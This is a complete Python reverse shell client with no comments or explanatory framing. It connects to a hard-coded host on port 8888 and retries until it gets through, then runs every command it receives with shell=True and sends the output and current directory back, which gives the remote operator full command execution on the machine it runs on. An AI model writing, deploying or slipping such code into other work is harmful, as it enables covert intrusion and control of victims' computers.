import subprocess
import socket
import os
import time
def init():
    try:
        host='192.168.29.251'
        port=8888
        global client
        client = socket.socket()
        client.connect((host,port))
    except:
        print('trying to connect to server')
        time.sleep(1)
        init()
init()
while True:
    data = client.recv(4026).decode('utf-8')
    if data == ' ':
        continue
    if data[:2] == 'cd':
        os.chdir(data[3:])
    if len(data) > 0:
        cmd = subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        output = cmd.stdout.read()+cmd.stderr.read()
        output_str = str(output,'utf-8')
        CurrentWD = 'client current working directory : '+os.getcwd()
        if data == 'echo %username%':
            client.send(bytes(output_str,'utf-8'))
            continue
        client.send(bytes(output_str+str(CurrentWD),'utf-8'))

        print(output_str)

        ''''''